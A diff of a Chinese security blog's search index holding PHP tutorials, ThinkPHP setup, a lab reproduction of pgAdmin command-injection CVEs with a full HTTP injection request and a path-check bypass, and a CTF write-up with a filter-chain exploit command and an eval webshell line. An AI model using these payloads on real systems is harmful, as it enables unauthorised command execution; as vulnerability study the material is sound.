class="keyword">function</span> <span class="title">parentsay</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">parent</span>::<span class="title function_ invoke__">say</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$child</span>=<span class="keyword">new</span> <span class="title function_ invoke__">child</span>();</span><br><span class="line"><span class="variable">$child</span>-&gt;<span class="title function_ invoke__">say</span>();</span><br><span class="line"><span class="variable">$child</span>-&gt;<span class="title function_ invoke__">smoke</span>();</span><br><span class="line"><span class="variable">$child</span>-&gt;<span class="title function_ invoke__">parentsay</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$child</span>-&gt;hobby;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果如下</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240621225741239.png" alt="image-20240621225741239"></p>
+<p>我们通过这个demo可以发现。在php中类的继承和java中类似，子类可以继承父类，子类也可以覆写父类的方法。当然子类能利用<code>parent::</code>关键字访问父类被覆盖的方法</p>
+<h3 id="trait修饰符"><a href="#trait修饰符" class="headerlink" title="trait修饰符"></a>trait修饰符</h3><p>使得被修饰的类可以进行复用，增加了代码的可复用性，使用这个修饰符就可以在一个类包含另一个类</p>
+<p>demo如下</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;test\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">rev1ve</span></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;rev1ve\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$t</span>=<span class="keyword">new</span> <span class="title function_ invoke__">rev1ve</span>();</span><br><span class="line"><span class="variable">$t</span>-&gt;<span class="title function_ invoke__">test</span>();</span><br></pre></td></tr></table></figure>
+
+<p>运行结果</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240621230229110.png" alt="image-20240621230229110"></p>
+<p>test是一个用trait修饰的类，所以我们只要在rev1ve类中use了test这个类，我们就可以调用其中的方法，类似于类的继承</p>
+<p>我们看下面有趣的demo</p>
+<p>test.php</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace first\test;</span><br><span class="line">use second\test1\test1;</span><br><span class="line">class test&#123;</span><br><span class="line">    use test1;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        echo &quot;test\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>test1.php</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace second\test1;</span><br><span class="line">require(&quot;test.php&quot;);</span><br><span class="line">use first\test\test;</span><br><span class="line">trait test1&#123;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        echo &quot;tostring\n&quot;;</span><br><span class="line">        return &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=new test();</span><br><span class="line">echo $a;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>这里选择的是phpstudy上搭建</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240618224916921.png" alt="image-20240618224916921"></p>
+<p>创建好网站后先下载下composer工具</p>
+<p>可以从<code>软件管理 =&gt; composer</code>处下载</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240618225035184.png" alt="image-20240618225035184"></p>
+<p>下载好后在管理打开composer</p>
+<p>选择php版本为大于5.3的</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240618225118126.png" alt="image-20240618225118126"></p>
+<p>然后执行命令安装</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">composer create-project topthink/think=5.0.24 tp5 --prefer-dist</span><br></pre></td></tr></table></figure>
+
+<p>安装成功后将tp5文件夹内的所有文件移到根目录<code>thinkphp5</code>下</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240618225813406.png" alt="image-20240618225813406"></p>
+<p>打开composer.json文件修改下配置，修改为<code>5.0.24</code></p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240618225852609.png" alt="image-20240618225852609"></p>
+<p>最后在刚刚执行composer命令的终端更新一下即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">composer update</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240618230022692.png" alt="image-20240618230022692"></p>
+<p>访问<code>./public</code>出现以下界面，说明环境搭建成功</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240618230210451.png" alt="image-20240618230210451"></p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://c1oudfl0w0.github.io/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">https://c1oudfl0w0.github.io/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a></p>
+<p><a href="https://boogipop.com/2023/03/02/ThinkPHP5.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A8%E5%A4%8D%E7%8E%B0/">https://boogipop.com/2023/03/02/ThinkPHP5.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A8%E5%A4%8D%E7%8E%B0/</a></p>
+]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
+      <tags>
+        <tag>ThinkPHP</tag>
+        <tag>代码审计</tag>
       </tags>
   </entry>
   <entry>
@@ -2675,66 +2876,9 @@
         <category>web安全</category>
       </categories>
       <tags>
-        <tag>模板注入</tag>
         <tag>原型链污染</tag>
+        <tag>模板注入</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>pgAdmin命令执行漏洞</title>
-    <url>/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html</url>
-    <content><![CDATA[<p>注意到p神在paper发的一篇跟pgAdmin命令执行漏洞有关的文章，所以利用vulhub靶场环境复现一下</p>
-<span id="more"></span>
-
-<h1 id="pgAdmin命令执行漏洞"><a href="#pgAdmin命令执行漏洞" class="headerlink" title="pgAdmin命令执行漏洞"></a>pgAdmin命令执行漏洞</h1><p><a href="https://paper.seebug.org/3144/#2-cve-2023-5002pgadmin-76">参考文章</a></p>
-<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote>
-<p>pgAdmin是一种开源的数据库管理工具，它用于管理和操作PostgreSQL数据库。PostgreSQL是一种功能强大的关系型数据库系统，而pgAdmin则是一个用于管理和维护这个数据库系统的图形用户界面（GUI）工具。</p>
-</blockquote>
-<p>本文复现关于pgAdmin的两个命令执行漏洞，结合源码进行分析 <a href="https://pgadmin-archive.postgresql.org/pgadmin4/index.html">源码链接</a></p>
-<h2 id="pgAdmin"><a href="#pgAdmin" class="headerlink" title="pgAdmin &lt;&#x3D; 6.16 未授权命令执行漏洞（CVE-2022-4223）"></a>pgAdmin &lt;&#x3D; 6.16 未授权命令执行漏洞（CVE-2022-4223）</h2><p>pgAdmin支持在后台设置psql、pg_dump、pg_restore等PostgreSQL数据库工具所在的基础路径，在保存设置前，用户可以执行<code>validate_binary_path</code>这个API来检查路径是否合法。</p>
-<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409223437075.png"></p>
-<p>这里用户传入的<code>utility_path</code>拼接上可执行文件名后，直接拼接进<code>subprocess.getoutput()</code>方法执行。这是一个非常简单的命令注入漏洞。而且这个API没有增加<code>@login_required</code>修饰器，任意用户均可调用这个函数，导致了在<code>/misc/validate_binary_path</code>路由下的未授权命令执行漏洞。</p>
-<p>在本地搭建环境，访问5050端口是登录界面</p>
-<p>然后我们抓包在accept头添加<code>application/json</code>，成功获取token值</p>
-<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409224520953.png"></p>
-<p>将获取到的<code>session id</code>和<code>csrf token</code>填写进去发包，并添加上执行命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /misc/validate_binary_path HTTP/1.1</span><br><span class="line">Host: 192.168.132.1:5050</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0</span><br><span class="line">X-pgA-CSRFToken: IjMyODM1ZTI2OGEzNjM3NmRiYzIyNDQ0YTFkNjQ3YzI4NWZmNDMwZmQi.ZhVW6g.9aUPlOreLBBdKoERuk8XTHn2bvE</span><br><span class="line">Accept: application/json,text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Cookie: pga4_session=698f6cec-3920-409a-8a39-cee41d7b7815!5R1QUKdHv1IxxFVR1iKc3HwVy0gN3hizTfVj3xTSjhI=</span><br><span class="line">Content-Length: 27</span><br><span class="line"></span><br><span class="line">&#123;&quot;utility_path&quot;:&quot;a\&quot;;id;#&quot;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>payload将前面的双引号闭合后，用<code>#</code>将后面代码注释掉</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">subprocess.getoutput(&#x27;&quot;a\&quot;;id;#&quot; --version&#x27;.format(full_path))</span><br></pre></td></tr></table></figure>
-
-<p>成功命令执行，返回包如下</p>
-<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409231120579.png"></p>
-<h2 id="pgAdmin-1"><a href="#pgAdmin-1" class="headerlink" title="pgAdmin &lt;&#x3D; 7.6 后台命令执行漏洞（CVE-2023-5002）"></a>pgAdmin &lt;&#x3D; 7.6 后台命令执行漏洞（CVE-2023-5002）</h2><p>官方对于CVE-2022-4223漏洞，做了如下两个处理：</p>
-<ul>
-<li>给<code>validate_binary_path</code>函数增加<code>@login_required</code>装饰器，限制未授权的用户访问相关接口  </li>
-<li>使用<code>os.path.exists()</code>检查用户传入的路径是否有效</li>
-</ul>
-<p><code>@login_required</code>装饰器是由Flask-Login这个第三方库提供的能力，并不存在绕过的问题，所以这个API后续就没法再无授权的情况下利用了。</p>
-<p>对于使用<code>os.path.exists()</code>检查用户传入的路径是否存在，我们可以有两个绕过方法：</p>
-<ul>
-<li>使用<code>../</code>跳转到一个存在的目录，如：<code>/path/to/exist/folder/a&quot;;id;/../</code></li>
-<li>通过文件上传等功能创建一个文件名中包含Payload的文件</li>
-</ul>
-<p>对于第一个方法来说（注意php和python环境都行）判断文件存在时，Windows会将路径normalize后再判断，Linux会逐级判断文件夹是否存在，因此具体执行结果也会不同</p>
-<p>Windows下返回结果为True</p>
-<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409232705036.png"></p>
-<p>而Linux下返回结果为False</p>
-<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409234553656.png"></p>
-<p>所以在Windows环境下我们可以直接绕过<code>os.path.exists()</code>继续注入命令，但Linux下则无法实现命令执行</p>
-<p>搭建环境，使用帐号<code>vulhub@example.com</code>和密码<code>vulhub</code>登录pgAdmin</p>
-<p>然后访问<code>工具 =&gt; 存储管理器</code>，创建目录<code>&quot;;id;#</code></p>
-<p>这样在与<code>/var/lib/pgadmin/storage/vulhub_example.com/</code>拼接后的绝对路径，用于漏洞利用</p>
-<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240410130307002.png"></p>
-<p>访问<code>设置 =&gt; 配置 =&gt;路径</code>界面，然后添加上刚刚拼接的绝对路径，点击验证</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/lib/pgadmin/storage/vulhub_example.com/&quot;;id;#</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240410130919337.png"></p>
-<p>成功命令执行</p>
-<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240410131015271.png"></p>
-]]></content>
-      <categories>
-        <category>漏洞分析</category>
-      </categories>
   </entry>
   <entry>
     <title>fastjson入门学习</title>
@@ -2992,6 +3136,63 @@
       </tags>
   </entry>
   <entry>
+    <title>pgAdmin命令执行漏洞</title>
+    <url>/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html</url>
+    <content><![CDATA[<p>注意到p神在paper发的一篇跟pgAdmin命令执行漏洞有关的文章，所以利用vulhub靶场环境复现一下</p>
+<span id="more"></span>
+
+<h1 id="pgAdmin命令执行漏洞"><a href="#pgAdmin命令执行漏洞" class="headerlink" title="pgAdmin命令执行漏洞"></a>pgAdmin命令执行漏洞</h1><p><a href="https://paper.seebug.org/3144/#2-cve-2023-5002pgadmin-76">参考文章</a></p>
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote>
+<p>pgAdmin是一种开源的数据库管理工具，它用于管理和操作PostgreSQL数据库。PostgreSQL是一种功能强大的关系型数据库系统，而pgAdmin则是一个用于管理和维护这个数据库系统的图形用户界面（GUI）工具。</p>
+</blockquote>
+<p>本文复现关于pgAdmin的两个命令执行漏洞，结合源码进行分析 <a href="https://pgadmin-archive.postgresql.org/pgadmin4/index.html">源码链接</a></p>
+<h2 id="pgAdmin"><a href="#pgAdmin" class="headerlink" title="pgAdmin &lt;&#x3D; 6.16 未授权命令执行漏洞（CVE-2022-4223）"></a>pgAdmin &lt;&#x3D; 6.16 未授权命令执行漏洞（CVE-2022-4223）</h2><p>pgAdmin支持在后台设置psql、pg_dump、pg_restore等PostgreSQL数据库工具所在的基础路径，在保存设置前，用户可以执行<code>validate_binary_path</code>这个API来检查路径是否合法。</p>
+<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409223437075.png"></p>
+<p>这里用户传入的<code>utility_path</code>拼接上可执行文件名后，直接拼接进<code>subprocess.getoutput()</code>方法执行。这是一个非常简单的命令注入漏洞。而且这个API没有增加<code>@login_required</code>修饰器，任意用户均可调用这个函数，导致了在<code>/misc/validate_binary_path</code>路由下的未授权命令执行漏洞。</p>
+<p>在本地搭建环境，访问5050端口是登录界面</p>
+<p>然后我们抓包在accept头添加<code>application/json</code>，成功获取token值</p>
+<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409224520953.png"></p>
+<p>将获取到的<code>session id</code>和<code>csrf token</code>填写进去发包，并添加上执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /misc/validate_binary_path HTTP/1.1</span><br><span class="line">Host: 192.168.132.1:5050</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0</span><br><span class="line">X-pgA-CSRFToken: IjMyODM1ZTI2OGEzNjM3NmRiYzIyNDQ0YTFkNjQ3YzI4NWZmNDMwZmQi.ZhVW6g.9aUPlOreLBBdKoERuk8XTHn2bvE</span><br><span class="line">Accept: application/json,text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Cookie: pga4_session=698f6cec-3920-409a-8a39-cee41d7b7815!5R1QUKdHv1IxxFVR1iKc3HwVy0gN3hizTfVj3xTSjhI=</span><br><span class="line">Content-Length: 27</span><br><span class="line"></span><br><span class="line">&#123;&quot;utility_path&quot;:&quot;a\&quot;;id;#&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload将前面的双引号闭合后，用<code>#</code>将后面代码注释掉</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">subprocess.getoutput(&#x27;&quot;a\&quot;;id;#&quot; --version&#x27;.format(full_path))</span><br></pre></td></tr></table></figure>
+
+<p>成功命令执行，返回包如下</p>
+<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409231120579.png"></p>
+<h2 id="pgAdmin-1"><a href="#pgAdmin-1" class="headerlink" title="pgAdmin &lt;&#x3D; 7.6 后台命令执行漏洞（CVE-2023-5002）"></a>pgAdmin &lt;&#x3D; 7.6 后台命令执行漏洞（CVE-2023-5002）</h2><p>官方对于CVE-2022-4223漏洞，做了如下两个处理：</p>
+<ul>
+<li>给<code>validate_binary_path</code>函数增加<code>@login_required</code>装饰器，限制未授权的用户访问相关接口  </li>
+<li>使用<code>os.path.exists()</code>检查用户传入的路径是否有效</li>
+</ul>
+<p><code>@login_required</code>装饰器是由Flask-Login这个第三方库提供的能力，并不存在绕过的问题，所以这个API后续就没法再无授权的情况下利用了。</p>
+<p>对于使用<code>os.path.exists()</code>检查用户传入的路径是否存在，我们可以有两个绕过方法：</p>
+<ul>
+<li>使用<code>../</code>跳转到一个存在的目录，如：<code>/path/to/exist/folder/a&quot;;id;/../</code></li>
+<li>通过文件上传等功能创建一个文件名中包含Payload的文件</li>
+</ul>
+<p>对于第一个方法来说（注意php和python环境都行）判断文件存在时，Windows会将路径normalize后再判断，Linux会逐级判断文件夹是否存在，因此具体执行结果也会不同</p>
+<p>Windows下返回结果为True</p>
+<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409232705036.png"></p>
+<p>而Linux下返回结果为False</p>
+<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409234553656.png"></p>
+<p>所以在Windows环境下我们可以直接绕过<code>os.path.exists()</code>继续注入命令，但Linux下则无法实现命令执行</p>
+<p>搭建环境，使用帐号<code>vulhub@example.com</code>和密码<code>vulhub</code>登录pgAdmin</p>
+<p>然后访问<code>工具 =&gt; 存储管理器</code>，创建目录<code>&quot;;id;#</code></p>
+<p>这样在与<code>/var/lib/pgadmin/storage/vulhub_example.com/</code>拼接后的绝对路径，用于漏洞利用</p>
+<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240410130307002.png"></p>
+<p>访问<code>设置 =&gt; 配置 =&gt;路径</code>界面，然后添加上刚刚拼接的绝对路径，点击验证</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/lib/pgadmin/storage/vulhub_example.com/&quot;;id;#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240410130919337.png"></p>
+<p>成功命令执行</p>
+<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240410131015271.png"></p>
+]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
+  </entry>
+  <entry>
     <title>信息搜集</title>
     <url>/article/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86.html</url>
     <content><![CDATA[<p>渗透测试的信息搜集</p>
@@ -3079,6 +3280,110 @@
       </categories>
   </entry>
   <entry>
+    <title>博客常用设置</title>
+    <url>/article/%E5%8D%9A%E5%AE%A2%E5%B8%B8%E7%94%A8%E8%AE%BE%E7%BD%AE.html</url>
+    <content><![CDATA[<p>一些基于hexo搭建的博客的基本设置</p>
+<span id="more"></span>
+
+
+
+<h1 id="博客常用设置"><a href="#博客常用设置" class="headerlink" title="博客常用设置"></a>博客常用设置</h1><h2 id="本地部署"><a href="#本地部署" class="headerlink" title="本地部署"></a>本地部署</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="发表文章"><a href="#发表文章" class="headerlink" title="发表文章"></a>发表文章</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo cl &amp; hexo &amp; hexo g &amp; hexo d</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="设置标题"><a href="#设置标题" class="headerlink" title="设置标题"></a>设置标题</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: Clicker-HackTheBox</span><br><span class="line">tags:</span><br><span class="line">  - 提权</span><br><span class="line">categories:</span><br><span class="line">  - HTB-writeup</span><br><span class="line">date: 2024-1-10</span><br><span class="line">abbrlink: 6d2044b3</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">session伪造、perl_startup提权</span><br><span class="line">&lt;!-- more --&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;!-- more --&gt;</code>标签可以使文章只展示前文概要，阅读整篇文章需要点击进去</p>
+]]></content>
+      <categories>
+        <category>杂项</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>红明谷杯 2024</title>
+    <url>/article/%E7%BA%A2%E6%98%8E%E8%B0%B72024.html</url>
+    <content><![CDATA[<p>pcntl_exec绕过disable_function限制、Rust语言</p>
+<span id="more"></span>
+
+<h1 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h1><blockquote>
+<p>php版本为8.3.2</p>
+</blockquote>
+<p>源码如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">// flag.php</span><br><span class="line">if (isset($_POST[&#x27;f&#x27;])) &#123;</span><br><span class="line">    echo hash_file(&#x27;md5&#x27;, $_POST[&#x27;f&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>注意到<code>hash_file</code>函数，有点像侧信道攻击的<code>file</code>函数，去网上搜到有关<code>fliter_chains</code>的<a href="https://github.com/synacktiv/php_filter_chains_oracle_exploit">exp</a></p>
+<p>该脚本可利用函数<code>file()</code> 、 <code>hash_file()</code> 、 <code>file_get_contents()</code> 或 <code>copy()</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 filters_chain_oracle_exploit.py --target url --file &#x27;flag.php&#x27; --parameter f</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/%E7%BA%A2%E6%98%8E%E8%B0%B72024/image-20240404112621747.png"></p>
+<p>爆出来参数为ezphpPhp8，加上参数就可以看到<code>flag.php</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&#x27;ezphpPhp8&#x27;])) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    die(&quot;No&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$a = new class &#123;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getflag()</span><br><span class="line">    &#123;</span><br><span class="line">        system(&#x27;cat /flag&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">unset($a);</span><br><span class="line">$a = $_GET[&#x27;ezphpPhp8&#x27;];</span><br><span class="line">$f = new $a();</span><br><span class="line">$f-&gt;getflag();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后这里的 $a 是匿名类，但是 unset 会销毁变量，这下不会了</p>
+<p>这个时候要找一下如何触发一个匿名类 <a href="https://hi-arkin.com/archives/php-anonymous-stdClass.html">参考文章</a></p>
+<p>匿名类的类名与文件所在行列相关，即同一个位置实例出来的类为同一个类</p>
+<p>也就是说虽然被销毁了但是我们实例化出来是一样的类</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$obj=new class&#123;&#125;;</span><br><span class="line">// class名为: &#x27;class@anonymous&#x27;+chr(0)+php文件路径+行数$列数</span><br><span class="line">echo get_class($obj);</span><br></pre></td></tr></table></figure>
+
+<p>payload如下</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/flag.php?ezphpPhp8=<span class="class"><span class="keyword">class</span>@<span class="title">anonymous</span>%00/<span class="title">var</span>/<span class="title">www</span>/<span class="title">html</span>/<span class="title">flag</span>.<span class="title">php</span>:7$0</span></span><br></pre></td></tr></table></figure>
+
+<p>这里的列数是随机的，bp抓包爆破一下即可</p>
+<h1 id="unauth"><a href="#unauth" class="headerlink" title="unauth"></a>unauth</h1><p>打开题目有个弹框登录</p>
+<p><img src="/article/%E7%BA%A2%E6%98%8E%E8%B0%B72024/image-20240403200058890.png"></p>
+<p>扫目录发现有日志文件泄露，得到admin密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[2022-01-01 12:34:56]  Authentication successful - User: admin Pass: 2e525e29e465f45d8d7c56319fe73036</span><br></pre></td></tr></table></figure>
+
+<p>成功登录，源码如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (!isset($_SERVER[&#x27;PHP_AUTH_USER&#x27;])) &#123;</span><br><span class="line">    header(&#x27;WWW-Authenticate: Basic realm=&quot;Restricted Area&quot;&#x27;);</span><br><span class="line">    header(&#x27;HTTP/1.0 401 Unauthorized&#x27;);</span><br><span class="line">    echo &#x27;小明是运维工程师，最近网站老是出现bug。&#x27;;</span><br><span class="line">    exit;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $validUser = &#x27;admin&#x27;;</span><br><span class="line">    $validPass = &#x27;2e525e29e465f45d8d7c56319fe73036&#x27;;</span><br><span class="line"></span><br><span class="line">    if ($_SERVER[&#x27;PHP_AUTH_USER&#x27;] != $validUser || $_SERVER[&#x27;PHP_AUTH_PW&#x27;] != $validPass) &#123;</span><br><span class="line">        header(&#x27;WWW-Authenticate: Basic realm=&quot;Restricted Area&quot;&#x27;);</span><br><span class="line">        header(&#x27;HTTP/1.0 401 Unauthorized&#x27;);</span><br><span class="line">        echo &#x27;Invalid credentials&#x27;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@eval($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>尝试查看phpinfo发现不行，写个马蚁剑连接先</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=?&gt;&lt;?=eval($_POST[1]);</span><br></pre></td></tr></table></figure>
+
+<p>记得下面的请求信息带上请求头<code>Authorization：Basic YWRtaW46MmU1MjVlMjllNDY1ZjQ1ZDhkN2M1NjMxOWZlNzMwMzY=</code></p>
+<p><img src="/article/%E7%BA%A2%E6%98%8E%E8%B0%B72024/image-20240403212517974.png"></p>
+<p>查看<code>php.ini</code>，禁用函数如下</p>
